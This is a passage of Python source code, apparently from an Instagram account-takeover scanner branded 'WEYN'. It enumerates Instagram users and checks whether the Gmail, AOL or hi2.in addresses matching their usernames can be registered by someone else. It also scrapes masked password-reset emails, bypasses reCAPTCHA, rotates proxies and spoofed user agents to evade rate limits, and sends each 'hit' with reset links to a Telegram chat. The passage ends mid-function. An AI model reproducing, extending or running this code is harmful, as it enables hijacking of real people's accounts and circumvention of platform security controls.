            '.JMX40ZssLtCMlaqAOZYFU6Tz6rggXd8IYA-lVO2jkmWcFPGEJ3tTkOj7qGkKjtTLXofPUFFQ6Uzih1pYCkh_fgS1zD8X5Ge3c0oSKTchP4AdNmsEetEyDMoUijvOWJVVbDe0byUHYQzCmE7F-o2187M5fpzxgGEV6U-7Xm4ywaA'
        )
        data = {
            'specId': specId, 'acrumb': acrumb,
            'sessionIndex': sessionIndex, 'userId': username, 'validateField': 'userId',
        }
        headers2 = {
            'authority': 'login.aol.com', 'accept': '*/*',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://login.aol.com', 'referer': create_url,
            'user-agent': random.choice(_M1_WEB_USER_AGENTS),
            'x-requested-with': 'XMLHttpRequest',
        }
        r2 = s.post(validate_url, headers=headers2, data=data, timeout=10)
        if r2.status_code == 200:
            try:
                jdata    = r2.json()
                uid_field = jdata.get('fields', {}).get('userId', {})
                if 'error' not in uid_field:
                    return True
                _m1_bad_email += 1
                _web_state['bad_email'] = _m1_bad_email
                return False
            except Exception:
                if 'IDENTIFIER_AVAILABLE' in r2.text or '"errors":[]' in r2.text:
                    return True
                _m1_bad_email += 1
                _web_state['bad_email'] = _m1_bad_email
                return False
        _m1_bad_email += 1
        _web_state['bad_email'] = _m1_bad_email
        return False
    except Exception:
        _m1_bad_email += 1
        _web_state['bad_email'] = _m1_bad_email
        return False

# ── Password reset email fetch ────────────────────────────────────────────────

_M1_RESET_BASE_URL = 'https://www.instagram.com'
_M1_RESET_URL      = 'https://www.instagram.com/accounts/password/reset/'
_M1_RESET_AJAX_URL = 'https://www.instagram.com/api/v1/web/accounts/account_recovery_send_ajax/'
_M1_RESET_UA_WEB   = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36'
_M1_RESET_UA_APP   = 'Instagram 320.0.0.34.109 Android (33/13; 420dpi; 1080x2340; samsung; SM-A546B; a54x; exynos1380; tr_TR; 465123678)'

def _m1_fetch_reset_email(username: str) -> str:
    for attempt in range(2):
        try:
            client = httpx.Client(http2=True, follow_redirects=True)
            try:
                client.get(_M1_RESET_BASE_URL, headers={
                    'User-Agent': _M1_RESET_UA_WEB,
                    'Accept': 'text/html,application/xhtml+xml,*/*;q=0.9',
                    'Accept-Language': 'tr-TR,tr;q=0.9',
                    'sec-fetch-dest': 'document',
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-site': 'none',
                }, timeout=10)
            except Exception:
                client.close()
                continue
            csrf = ''
            for c in client.cookies.jar:
                if c.name == 'csrftoken':
                    csrf = c.value
                    break
            if not csrf:
                client.close()
                continue
            headers = {
                'User-Agent': _M1_RESET_UA_APP,
                'Accept': '*/*',
                'Accept-Language': 'tr-TR,tr;q=0.9',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin': _M1_RESET_BASE_URL,
                'Referer': _M1_RESET_URL,
                'X-CSRFToken': csrf,
                'X-IG-App-ID': '936619743392459',
                'X-Requested-With': 'XMLHttpRequest',
                'X-Instagram-AJAX': '1',
            }
            data = urllib.parse.urlencode({'email_or_username': username})
            r    = client.post(_M1_RESET_AJAX_URL, content=data.encode(), headers=headers, timeout=10)
            client.close()
            result = r.json()
            if result.get('status') == 'ok':
                for key in ('obfuscated_email', 'contact_point', 'masked_email', 'email'):
                    val = result.get(key)
                    if val:
                        return val
                return '-'
            continue
        except Exception:
            continue
    return '-'

# ── Hit recording ─────────────────────────────────────────────────────────────

def _m1_process_hit(username: str, domain: str, user: dict, token: str, chat_id: str) -> None:
    global _m1_hits, _m1_total, _m1_found_emails

    followers  = user.get('follower_count', 0) or 0
    followings = user.get('following_count', 0) or 0
    posts      = user.get('media_count', 0) or 0
    name       = user.get('full_name', 'None') or 'None'
    bio        = (user.get('biography', '') or '')[:50]
    private    = user.get('is_private', False)
    verified   = user.get('is_verified', False)
    business   = user.get('is_business', False)
    user_id    = user.get('pk', 'Unknown')
    year       = gdate(user_id)
    email      = f'{username}@{domain}'
    reset_mask = _m1_fetch_reset_email(username)
    meta       = 'True' if posts > 2 else 'False'

    with _m1_hit_lock:
        _m1_hits  += 1
        _m1_total += 1
        hit_num    = _m1_hits

    msg = (
        f'\n\n=============================\n'
        f'GOT A HIT  #WEYN M1\n'
        f'=============================\n'
        f'TOTAL HITS  : {hit_num}\n'
        f'USERNAME    : @{username}\n'
        f'EMAIL       : {email}\n'
        f'RESET MASK  : {reset_mask}\n'
        f'NAME        : {name}\n'
        f'FOLLOWERS   : {followers}\n'
        f'FOLLOWING   : {followings}\n'
        f'POSTS       : {posts}\n'
        f'BIO         : {bio}\n'
        f'BUSINESS    : {business}\n'
        f'META        : {meta}\n'
        f'YEAR        : {year}\n'
        f'PROFILE     : https://www.instagram.com/{username}\n'
        f'RESET       : https://www.instagram.com/accounts/password/reset/\n'
        f'=============================\n'
        f'BY ~ @jinbelowg @weyn_vouches'
    )

    _save_hit_to_file(msg)

    hit_entry = json.dumps({'e': email, 'u': username})
    with _m1_found_lock:
        _m1_found_emails.append(hit_entry)
        if len(_m1_found_emails) > 200:
            _m1_found_emails.pop(0)

    _web_state['hits']        = _m1_hits
    _web_state['total']       = _m1_total
    _web_state['recent_hits'] = list(_m1_found_emails[-20:])

    _queue_telegram(token, chat_id, msg)

# ── Scanner worker ────────────────────────────────────────────────────────────

def _m1_scrape_worker(token: str, chat_id: str, min_followers: int,
                       id_ranges: list, google_session: requests.Session,
                       stop_event) -> None:
    global _m1_scanned
    session = requests.Session()
    try:
        session.get('https://www.instagram.com/',
                    headers={'User-Agent': random.choice(_M1_WEB_USER_AGENTS)},
                    timeout=8)
    except Exception:
        pass

    _DOMAINS = ['@gmail.com', '@aol.com']

    while not (stop_event and stop_event.is_set()):
        try:
            low, high, _ = random.choice(id_ranges)
            uid = random.randint(low, high)
            lsd = ''.join(random.choices(
                'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=16))
            headers = {
                'accept': '*/*',
                'accept-language': 'en,en-US;q=0.9',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://www.instagram.com',
                'referer': 'https://www.instagram.com/',
                'user-agent': random.choice(_M1_USER_AGENTS),
                'x-fb-friendly-name': 'PolarisProfilePageContentQuery',
                'x-fb-lsd': lsd,
            }
            variables = {
                'enable_integrity_filters': True,
                'id': str(uid),
                '__relay_internal__pv__PolarisCannesGuardianExperienceEnabledrelayprovider': True,
                '__relay_internal__pv__PolarisCASB976ProfileEnabledrelayprovider': False,
                '__relay_internal__pv__PolarisWebSchoolsEnabledrelayprovider': False,
                '__relay_internal__pv__PolarisRepostsConsumptionEnabledrelayprovider': False,
            }
            data = {
                'lsd': lsd,
                'fb_api_caller_class': 'RelayModern',
                'fb_api_req_friendly_name': 'PolarisProfilePageContentQuery',
                'variables': json.dumps(variables),
                'server_timestamps': 'true',
                'doc_id': '26672929172408668',
            }

            _m1_scanned += 1
            _web_state['scanned'] = _m1_scanned

            if stop_event and stop_event.is_set():
                break

            resp = session.post('https://www.instagram.com/api/graphql',
                                headers=headers, data=data, timeout=10)

            if resp.status_code == 429:
                _interruptible_sleep(random.uniform(2, 5), stop_event)
                continue
            if resp.status_code != 200:
                continue

            user = resp.json().get('data', {}).get('user')
            if user and user.get('username'):
                username = user['username']
                if min_followers > 0 and user.get('follower_count', 0) < min_followers:
                    continue
                for domain in _DOMAINS:
                    if stop_event and stop_event.is_set():
                        return
                    email = f'{username}{domain}'
                    if _m1_lookup(email):
                        domain_name = domain.lstrip('@')
                        if domain_name == 'gmail.com':
                            if _m1_check_gmail(email, google_session):
                                _m1_process_hit(username, domain_name, user, token, chat_id)
                        elif domain_name == 'aol.com':
                            if _m1_check_aol(email):
                                _m1_process_hit(username, domain_name, user, token, chat_id)

            _interruptible_sleep(0.08, stop_event)

        except Exception:
            _interruptible_sleep(0.2, stop_event)

# ══════════════════════════════════════════════════════════
#  WEB ENTRY POINT  (called by app.py)
# ══════════════════════════════════════════════════════════

def run_method1_web(token, chat_id, year_choice, min_followers, stop_event):
    global _m1_hits, _m1_bad_insta, _m1_bad_email, _m1_good_insta
    global _m1_total, _m1_taken, _m1_limit, _m1_found_emails, _m1_scanned
    global _m1_pool, _m1_lookup_pool

    _m1_hits = _m1_bad_insta = _m1_bad_email = _m1_good_insta = 0
    _m1_total = _m1_taken = _m1_limit = _m1_scanned = 0
    _m1_found_emails = []

    _write_session_separator(1)
    _web_state.update({
        'running': True, 'method': '1',
        'hits': 0, 'good': 0, 'bad_insta': 0, 'bad_email': 0,
        'taken': 0, 'limit': 0, 'total': 0, 'scanned': 0,
        'recent_hits': [], 'tg_status': '', 'tg_error': '',
        'start_time': time.time(),
    })

    # Load cached Instagram sessions
    _m1_load_session_pool()

    # Build year ID ranges for this run
    if year_choice is not None:
        id_ranges = [(lo, hi, yr) for lo, hi, yr in WORKING_RANGES if yr == year_choice]
        if not id_ranges:
            id_ranges = list(WORKING_RANGES)
    else:
        id_ranges = list(WORKING_RANGES)

    # Generate initial Google token (needed for gmail checks)
    _m1_generate_google_token()

    # Background token refresher
    Thread(target=_m1_token_refresh_background, args=(stop_event,), daemon=True).start()

    NUM_WORKERS = int(os.environ.get('M1_WORKERS', 300))
    google_session = requests.Session()

    try:
        pool     = ThreadPoolExecutor(max_workers=NUM_WORKERS)
        _m1_pool = pool
        futures  = []
        for _ in range(NUM_WORKERS):
            try:
                futures.append(pool.submit(
                    _m1_scrape_worker, token, chat_id, min_followers,
                    id_ranges, google_session, stop_event
                ))
            except RuntimeError:
                break
        if not futures:
            _web_state['tg_status'] = 'error'
            _web_state['tg_error']  = 'Could not start scan workers (out of threads). Try again in a moment.'
        for future in as_completed(futures):
            try:
                future.result()
            except Exception:
                pass
    finally:
        _m1_pool        = None
        _m1_lookup_pool = None
        _web_state['running'] = False


# ══════════════════════════════════════════════════════════════════════════════
#  HI2.IN AVAILABILITY CHECK  (shared by M2 and M3)
# ══════════════════════════════════════════════════════════════════════════════
#
#  Flow (from hi2.in HAR / invisible reCAPTCHA v2):
#    1. GET /recaptcha/api2/anchor  →  challenge token
#    2. POST /recaptcha/api2/reload →  final reCAPTCHA response token
#    3. POST https://hi2.in/api/custom  →  200 {"email":"prefix@domain","hash":…}
#       • 200 with matching email  = inbox is available on hi2.in  ✓
#       • anything else            = not available / blocked        ✗

_HI2_SITEKEY  = '6LfEUPkgAAAAAKTgbMoewQkWBEQhO2VPL4QviKct'
_HI2_CO       = base64.urlsafe_b64encode(b'https://hi2.in:443').decode().rstrip('=')
_HI2_VER_CACHE:   dict = {'v': None, 'ts': 0.0}
_HI2_VER_LOCK   = Lock()
_HI2_TOK_CACHE:  dict = {}   # proxy key (or 'direct') -> {'token':..., 'ts':...}, reused < 90 s
_HI2_TOK_LOCK   = Lock()
_HI2_UA       = ('Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                 'AppleWebKit/537.36 (KHTML, like Gecko) '
                 'Chrome/120.0.0.0 Safari/537.36')


def _hi2_get_version() -> str:
    """Return the current reCAPTCHA JS version (cached 1 h)."""
    with _HI2_VER_LOCK:
        if _HI2_VER_CACHE['v'] and time.time() - _HI2_VER_CACHE['ts'] < 3600:
            return _HI2_VER_CACHE['v']
    try:
        r = requests.get(
            'https://www.google.com/recaptcha/api.js',
            params={'render': _HI2_SITEKEY},
            headers={'User-Agent': _HI2_UA},
            timeout=8,
        )
        m = re.search(r'/releases/([A-Za-z0-9_\-]+)/', r.text)
        if m:
            with _HI2_VER_LOCK:
                _HI2_VER_CACHE['v']  = m.group(1)
                _HI2_VER_CACHE['ts'] = time.time()
            return m.group(1)
    except Exception:
        pass
    return 'rAqPVhe2JMK6mSJKi8r_vw'          # safe fallback


def _hi2_get_recaptcha_token(proxy: str | None = None) -> str | None:
    """Return a valid invisible reCAPTCHA v2 token for hi2.in (cached 90 s).

    Fetched through the same proxy (if any) that will make the follow-up
    /api/custom call, so the recaptcha session and the check are always
    made from the same exit IP — mixing IPs between the two risks hi2.in
    treating the token as invalid/suspicious and just failing the check.
    Cached per-proxy so different proxies don't share a token cache.
    """
    cache_key = proxy or 'direct'
    with _HI2_TOK_LOCK:
        entry = _HI2_TOK_CACHE.get(cache_key)
        if entry and time.time() - entry['ts'] < 90:
            return entry['token']

    version = _hi2_get_version()
    cb      = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))

    s = requests.Session()
    s.headers.update({'User-Agent': _HI2_UA, 'Accept-Language': 'en-US,en;q=0.9'})
    if proxy:
        proxies = proxy_pool.as_requests_dict(proxy)
        if proxies:
            s.proxies.update(proxies)

    # ── Step 1: anchor ────────────────────────────────────────────────────────
    anchor_url = (
        f'https://www.google.com/recaptcha/api2/anchor'
        f'?ar=1&k={_HI2_SITEKEY}&co={_HI2_CO}'
        f'&hl=en&v={version}&size=invisible&cb={cb}'
    )
    try:
        r1 = s.get(anchor_url, timeout=8)
    except Exception:
        return None

    challenge = None
    for pat in (r'"rresp","([^"]+)"',
                r'id="recaptcha-token" value="([^"]+)"'):
        m = re.search(pat, r1.text)
        if m:
            challenge = m.group(1)
            break
    if not challenge:
        return None

    # ── Step 2: reload ────────────────────────────────────────────────────────
    reload_url = f'https://www.google.com/recaptcha/api2/reload?k={_HI2_SITEKEY}'
    payload    = (
        f'v={version}&reason=q&c={urllib.parse.quote(challenge)}'
        f'&k={_HI2_SITEKEY}&co={_HI2_CO}&hl=en&size=invisible'
        f'&chr=%5B89%2C64%2C27%5D&vh=13599012192&bg=!GgA4oQEAABkEBQAAAA'
    )
    try:
        r2 = s.post(
            reload_url, data=payload,
            headers={'Content-Type': 'application/x-www-form-urlencoded',
                     'Referer': anchor_url},
            timeout=8,
        )
    except Exception:
        return None

    for pat in (r'"rresp","([^"]+)"', r'\["rresp","([^"]+)"'):
        m = re.search(pat, r2.text)
        if m:
            tok = m.group(1)
            with _HI2_TOK_LOCK:
                _HI2_TOK_CACHE[cache_key] = {'token': tok, 'ts': time.time()}
            return tok
    return None


def _hi2_check_available(username: str, domain: str = 'hi2.in') -> bool:
    """Return True if username@domain is available on hi2.in, False if not.

    Uses POST /api/custom (as seen in the hi2.in website HAR):
      • 200 with email == username@domain  →  available  →  save hit
      • 200 with different domain          →  unavailable (domain not assigned)
      • 400 / 429 / error                 →  unavailable
      • network failure                   →  True  (don't block on outage)

    hi2.in rate-limits/blocks by source IP once a scan session sends heavy
    volume, which is why real hits stop showing up after tens of thousands
    of scanned ids. This call (and only this call) goes through a rotating
    proxy pool so it isn't tied to the container's own IP — see
    proxy_pool.py. The recaptcha token is fetched through that same proxy
    so the whole check comes from one consistent exit IP. Falls back to a
    direct request if no proxy is available.
    """
    proxy_pool.ensure_started()
    proxy = proxy_pool.get_proxy()

    token = _hi2_get_recaptcha_token(proxy)
    if not token:
        return False         # can't verify → don't save unconfirmed hit

    try:
        r = requests.post(
            'https://hi2.in/api/custom',
            data={'domain': domain, 'prefix': username, 'recaptcha': token},
            headers={
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin':   'https://hi2.in',
                'Referer':  'https://hi2.in/',
                'User-Agent': _HI2_UA,
            },
            proxies=proxy_pool.as_requests_dict(proxy) if proxy else None,
            timeout=12,
        )
        if r.status_code == 200:
            proxy_pool.report_success(proxy)
            data  = r.json()
            email = data.get('email', '').lower()
            return email == f'{username}@{domain}'.lower()
        # 429 rate-limit or any other error → not available
        proxy_pool.report_failure(proxy)
        return False
    except Exception:
        proxy_pool.report_failure(proxy)
        return False         # network error → don't save unconfirmed hit


# ══════════════════════════════════════════════════════════════════════════════
#  METHOD 2  —  HI2 ALT
# ══════════════════════════════════════════════════════════════════════════════

_m2_hits         = 0
_m2_good_insta   = 0
_m2_bad_insta    = 0
_m2_bad_email    = 0
_m2_taken        = 0
_m2_limit        = 0
_m2_total        = 0
_m2_scanned      = 0
_m2_found_emails: list = []
_m2_found_lock   = Lock()
_m2_email_list:  list = []   # email-only, full session list for download
_m2_hit_lock     = Lock()
_m2_pool:        ThreadPoolExecutor = None
_m1_pool:        ThreadPoolExecutor = None

# ── Instagram email check — V1 (check_email) then V2 (bloks) fallback ─────────

def _m2_generate_ua():
    devices = [
        ("samsung", "SM-G973F", "beyond1", "exynos9820"),
        ("samsung", "SM-A536B", "a53x",    "exynos1280"),
        ("Google",  "Pixel 7",  "panther", "gs201"),
        ("Xiaomi",  "M2102J20SG","ares",   "mt6893"),
        ("OnePlus", "ONEPLUS A6003","OnePlus6","sdm845"),
    ]
    brand, model, device, board = random.choice(devices)
    android_ver = random.choice(["11", "12", "13", "14"])
    api_level   = {"11": "30", "12": "31", "13": "33", "14": "34"}[android_ver]
    dpi         = random.choice(["420", "440", "450", "480"])
    res         = random.choice(["1080x2280", "1080x2400", "1440x3088"])
    ig_ver      = f"{random.randint(280, 340)}.0.0.{random.randint(10, 40)}.{random.randint(80, 150)}"
    rnd         = random.randint(300000000, 400000000)
    return (f"Instagram {ig_ver} Android ({api_level}/{android_ver}; {dpi}dpi; {res}; "
            f"{brand}; {model}; {device}; {board}; en_US; {rnd})")


def _m2_check_v1(email, client):
    """Fast path: check_email endpoint — returns 'registered', 'not_registered', or 'check_v2'."""
    try:
        resp = client.post(
            "https://i.instagram.com/api/v1/users/check_email/",
            data=f"email={email}",
            headers={
                'User-Agent': _m2_generate_ua(),
                'content-type': "application/x-www-form-urlencoded; charset=UTF-8",
                'x-ig-app-id': "567067343352427",
                'accept-language': "en-IN, en-US",
            }
        )
        if 'email_is_taken' in resp.text:
            return 'registered'
        if 'available' in resp.text.lower() or '"valid"' in resp.text:
            return 'not_registered'
        return 'check_v2'
    except Exception:
        return 'check_v2'


def _m2_check_v2(email, client):
    """Fallback: bloks CAA search — email appears in response only when found."""
    android = "android-" + secrets.token_hex(8)
    device  = str(uuid.uuid4())
    family  = str(uuid.uuid4())
    url     = "https://i.instagram.com/api/v1/bloks/async_action/com.bloks.www.caa.ar.search.async/"
    payload = {
        'params': (
            '{"client_input_params":{"search_query":"' + email +
            '","was_headers_prefill_available":0,"was_headers_prefill_used":0,'
            '"text_input_id":"akyuf0:61","accounts_list":[],"fetched_email_list":[],'
            '"fetched_email_token_list":{},"sso_accounts_auth_data":[],"ig_oauth_token":[],'
            '"auth_secure_device_id":"","encrypted_msisdn":"","is_oauth_without_permission":0,'
            '"is_whatsapp_installed":1,"lois_settings":{"lois_token":""},'
            '"flash_call_permissions_status":{"READ_PHONE_STATE":"PERMANENTLY_DENIED",'
            '"READ_CALL_LOG":"DENIED","ANSWER_PHONE_CALLS":"DENIED"}},'
            '"server_params":{"event_request_id":"' + str(uuid.uuid4()) +
            '","is_from_logged_out":0,"device_id":"' + android +
            '","login_surface":"login_home","waterfall_id":"' + str(uuid.uuid4()) +
            '","is_platform_login":0,"login_entry_point":"logged_out",'
            '"family_device_id":"' + family + '","qe_device_id":"' + device + '"}}'
        ),
        'bk_client_context': '{"bloks_version":"5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b","styles_id":"instagram"}',
        'bloks_versioning_id': "5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b",
    }
    headers = {
        'User-Agent': _m2_generate_ua(),
        'accept-language': "en-IN, en-US",
        'x-bloks-version-id': "5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b",
        'x-fb-friendly-name': "IgApi: bloks/async_action/com.bloks.www.caa.ar.search.async/",
        'x-ig-android-id': android,
        'x-ig-app-id': "567067343352427",
        'x-ig-app-locale': "en_IN",
        'x-ig-client-endpoint': "com.bloks.www.caa.ar.search",
        'x-ig-device-id': device,
        'x-ig-family-device-id': family,
        'x-ig-timezone-offset': str(int(datetime.now().astimezone().utcoffset().total_seconds())),
        'x-mid': base64.urlsafe_b64encode(secrets.token_bytes(18)).decode().rstrip('='),
        'x-pigeon-session-id': f"UFS-{uuid.uuid4()}-0",
    }
    try:
        resp = client.post(url, data=payload, headers=headers)
        if email in resp.text:
            username = None
            m = re.search(r'"username"\s*:\s*"([A-Za-z0-9_.]{1,30})"', resp.text)
            if m:
                username = m.group(1)
            return ('registered', username)
        return ('not_registered', None)
    except Exception:
        return ('unknown', None)


# ── Worker: one persistent client per thread, generate hi2.in email and check ─

_M2_CHARS = 'abcdefghijklmnopqrstuvwxyz'

def _m2_gen_prefix():
    return ''.join(random.choices(_M2_CHARS, k=random.randint(6, 7)))


def _m2_worker(token, chat_id, stop_event):
    global _m2_hits, _m2_good_insta, _m2_bad_insta, _m2_bad_email, _m2_scanned, _m2_total, _m2_found_emails

    try:
        client = httpx.Client(http2=True, timeout=5)
    except Exception:
        client = httpx.Client(timeout=5)
    _register_session(client)

    try:
        while not (stop_event and stop_event.is_set()):
            try:
                email = _m2_gen_prefix() + '@hi2.in'
                _m2_scanned += 1
                _web_state['scanned'] = _m2_scanned

                if stop_event and stop_event.is_set():
                    break

                result_v1 = _m2_check_v1(email, client)

                if result_v1 == 'registered':
                    # Confirm with V2
                    v2_status, username = _m2_check_v2(email, client)
                    if v2_status == 'registered':
                        _m2_good_insta += 1
                        _web_state['good'] = _m2_good_insta
                        # ── hi2.in gate ───────────────────────────────────
                        prefix = email.split('@')[0]
                        if _hi2_check_available(prefix, 'hi2.in'):
                            _m2_record_hit(token, chat_id, email, username)
                        else:
                            _m2_bad_insta += 1
                            _web_state['bad_insta'] = _m2_bad_insta
                        # ─────────────────────────────────────────────────
                    elif v2_status == 'not_registered':
                        _m2_bad_insta += 1
                        _web_state['bad_insta'] = _m2_bad_insta
                    else:
                        # V2 inconclusive — trust V1
                        _m2_good_insta += 1
                        _web_state['good'] = _m2_good_insta
                        prefix = email.split('@')[0]
                        if _hi2_check_available(prefix, 'hi2.in'):
                            _m2_record_hit(token, chat_id, email, username)
                        else:
                            _m2_bad_insta += 1
                            _web_state['bad_insta'] = _m2_bad_insta

                elif result_v1 == 'check_v2':
                    v2_status, username = _m2_check_v2(email, client)
                    if v2_status == 'registered':
                        _m2_good_insta += 1
                        _web_state['good'] = _m2_good_insta
                        # ── hi2.in gate ───────────────────────────────────
                        prefix = email.split('@')[0]
                        if _hi2_check_available(prefix, 'hi2.in'):
                            _m2_record_hit(token, chat_id, email, username)
                        else:
                            _m2_bad_insta += 1
                            _web_state['bad_insta'] = _m2_bad_insta
                        # ─────────────────────────────────────────────────
                    elif v2_status == 'unknown':
                        _m2_bad_email += 1
                        _web_state['bad_email'] = _m2_bad_email
                    else:
                        _m2_bad_insta += 1
                        _web_state['bad_insta'] = _m2_bad_insta
                else:
                    _m2_bad_insta += 1
                    _web_state['bad_insta'] = _m2_bad_insta

            except Exception:
                continue
    finally:
        try:
            client.close()
        except Exception:
            pass


def _m2_record_hit(token, chat_id, email, username=None):
    global _m2_hits, _m2_total, _m2_email_list
    with _m2_hit_lock:
        _m2_hits  += 1
        _m2_total += 1
        hit_num    = _m2_hits
        _m2_email_list.append(email)

    profile = username or email.split('@')[0]
    msg = (
        f"\n\n=============================\n"
        f"GOT A HIT  #WEYN HI2 ALT\n"
        f"=============================\n"
        f"TOTAL HITS : {hit_num}\n"
        f"EMAIL      : {email}\n"
        f"USERNAME   : @{profile}\n"
        f"RESET      : https://www.instagram.com/accounts/password/reset/\n"
        f"PROFILE    : https://www.instagram.com/{profile}\n"
        f"=============================\n"
        f"BY ~ @jinbelowg @weyn_vouches"
    )

    _save_hit_to_file(msg)

    hit_entry = json.dumps({"e": email, "u": profile})
    with _m2_found_lock:
        _m2_found_emails.append(hit_entry)
        if len(_m2_found_emails) > 200:
            _m2_found_emails.pop(0)

    _web_state['hits']        = _m2_hits
    _web_state['total']       = _m2_total
    _web_state['recent_hits'] = list(_m2_found_emails[-20:])

    _queue_telegram(token, chat_id, msg)


# ── Web entry point ────────────────────────────────────────────────────────────

def run_method2_web(token, chat_id, min_followers, stop_event):
    global _m2_hits, _m2_good_insta, _m2_bad_insta, _m2_bad_email
    global _m2_taken, _m2_limit, _m2_total, _m2_scanned, _m2_found_emails
    global _m2_pool, _m2_email_list

    _m2_hits = _m2_good_insta = _m2_bad_insta = _m2_bad_email = 0
    _m2_taken = _m2_limit = _m2_total = _m2_scanned = 0
    _m2_found_emails = []
    _m2_email_list   = []

    _write_session_separator(2)
    _web_state.update({
        'running': True, 'method': '2',
        'hits': 0, 'good': 0, 'bad_insta': 0, 'bad_email': 0,
        'taken': 0, 'limit': 0, 'total': 0, 'scanned': 0,
        'recent_hits': [], 'tg_status': '', 'tg_error': '',
        'start_time': time.time(),
    })

    # Kept conservative — see weyn-thread-limits memory: this container
    # cannot reliably spawn hundreds of OS threads at once.
    NUM_WORKERS = int(os.environ.get('M2_WORKERS', 300))
    try:
        pool    = ThreadPoolExecutor(max_workers=NUM_WORKERS)
        _m2_pool = pool
        futures = []
        for _ in range(NUM_WORKERS):
            try:
                futures.append(pool.submit(_m2_worker, token, chat_id, stop_event))
            except RuntimeError:
                break
        if not futures:
            _web_state['tg_status'] = 'error'
            _web_state['tg_error']  = 'Could not start scan workers (out of threads). Try again in a moment.'
        for future in as_completed(futures):
            try:
                future.result()
            except Exception:
                pass
    finally:
        _m2_pool = None
        _web_state['running'] = False


# ══════════════════════════════════════════════════════════════════════════════
#  METHOD 3  —  ULTRA-FAST EMAIL SCANNER  (V2 engine)
# ══════════════════════════════════════════════════════════════════════════════

_m3_hits         = 0
_m3_good_insta   = 0
_m3_bad_insta    = 0
_m3_bad_email    = 0
_m3_taken        = 0
_m3_limit        = 0
_m3_total        = 0
_m3_scanned      = 0
_m3_found_emails: list = []
_m3_found_lock   = Lock()
_m3_email_list:  list = []   # email-only, full session list for download
_m3_hit_lock     = Lock()
_m3_pool: ThreadPoolExecutor = None
_m3_used_emails  = set()
_m3_used_lock    = Lock()

_M3_DOMAINS = ["@hi2.in", "@telegmail.com"]

# Common first names + popular suffixes → human-like usernames with high IG density
_M3_NAMES = [
    "alex","adam","ahmed","ali","anna","bella","ben","carlos","chloe","chris",
    "daniel","david","elena","emma","ethan","fatima","felix","grace","hana","ivan",
    "jack","james","jessica","john","julia","kevin","lara","laura","leo","liam",
    "lily","lucas","luna","marcus","maria","mark","matt","maya","mike","mia",
    "mohamed","nadia","nate","nick","nina","noah","olivia","omar","paris","paul",
    "peter","rachel","ryan","sara","sarah","sofia","steve","tom","tyler","zara",
    "max","sam","kim","jen","dan","kate","amy","jake","jay","joe",
    "nico","rafa","xavi","luca","marco","carlo","mario","luigi","sergio","pablo",
    "yusuf","hamza","hassan","ibrahim","ismail","karim","khalid","layla","nour","rania",
]

_M3_SUFFIXES = [
    "","1","2","7","9","01","07","09","10","11","12","13","21","23","99","00",
    "123","007","111","777","999","2000","2001","2002","2003","2004","2005",
    "2006","2007","2008","2009","2010","official","real","_","__","x","xx",
]


def _m3_gen_username():
    """Generate a human-like username: name+suffix or name+name or random."""
    mode = random.randint(0, 3)
    if mode == 0:
        # name + numeric suffix
        return random.choice(_M3_NAMES) + random.choice(_M3_SUFFIXES)
    elif mode == 1:
        # name + name
        n1, n2 = random.sample(_M3_NAMES, 2)
        return n1 + n2
    elif mode == 2:
        # name + 2-4 digit number
        return random.choice(_M3_NAMES) + str(random.randint(1, 9999))
    else:
        # short random (5-8 chars) with vowels so it looks human
        vowels = 'aeiou'
        cons   = 'bcdfghjklmnpqrstvwxyz'
        length = random.randint(5, 8)
        return ''.join(
            random.choice(vowels) if i % 2 else random.choice(cons)
            for i in range(length)
        )


def _m3_generate_android_ua():
    devices = [
        {"brand": "samsung",  "model": "SM-G973F",      "device": "beyond1",  "board": "exynos9820", "cpu": "exynos9820"},
        {"brand": "samsung",  "model": "SM-A536B",      "device": "a53x",     "board": "s5e8825",    "cpu": "exynos1280"},
        {"brand": "samsung",  "model": "SM-S918B",      "device": "dm1q",     "board": "kalama",     "cpu": "qcom"},
        {"brand": "Google",   "model": "Pixel 6",       "device": "raven",    "board": "raven",      "cpu": "gs101"},
        {"brand": "Google",   "model": "Pixel 7",       "device": "panther",  "board": "panther",    "cpu": "gs201"},
        {"brand": "Xiaomi",   "model": "M2102J20SG",    "device": "ares",     "board": "mt6893",     "cpu": "mtk"},
        {"brand": "Xiaomi",   "model": "Redmi Note 10", "device": "sweet",    "board": "sm6150",     "cpu": "qcom"},
        {"brand": "OnePlus",  "model": "ONEPLUS A6003",  "device": "OnePlus6", "board": "sdm845",     "cpu": "qcom"},
        {"brand": "OPPO",     "model": "CPH2371",        "device": "OP4F1F",   "board": "mt6893",     "cpu": "mtk"},
        {"brand": "HUAWEI",   "model": "ELE-L29",        "device": "HWELE",    "board": "kirin980",   "cpu": "hisilicon"},
    ]
    device      = random.choice(devices)
    android_ver = random.choice(["10", "11", "12", "13", "14"])
    api_level   = {"10": "29", "11": "30", "12": "31", "13": "33", "14": "34"}[android_ver]
    dpi         = random.choice(["320", "360", "394", "411", "420", "440", "450", "480"])
    width       = random.choice(["720", "1080", "1440"])
    height      = random.choice(["1520", "1600", "2280", "2340", "2400", "2560", "3200"])
    ig_ver      = f"{random.randint(280, 340)}.0.0.{random.randint(10, 40)}.{random.randint(80, 150)}"
    locale      = random.choice(["en_US", "en_GB", "ar_SA"])
    rnd_num     = random.randint(300000000, 400000000)
    return (
        f"Instagram {ig_ver} Android ({api_level}/{android_ver}; "
        f"{dpi}dpi; {width}x{height}; {device['brand']}; {device['model']}; "
        f"{device['device']}; {device['board']}; {locale}; {rnd_num})"
    )


def _m3_gen_session_id():
    part1 = ''.join(random.choices(string.ascii_lowercase + string.digits, k=5))
    part2 = ''.join(random.choices(string.ascii_lowercase + string.digits, k=5))
    return f"{part1}:{part2}:{random.randint(100, 999)}"


def _m3_check_v1(email, client):
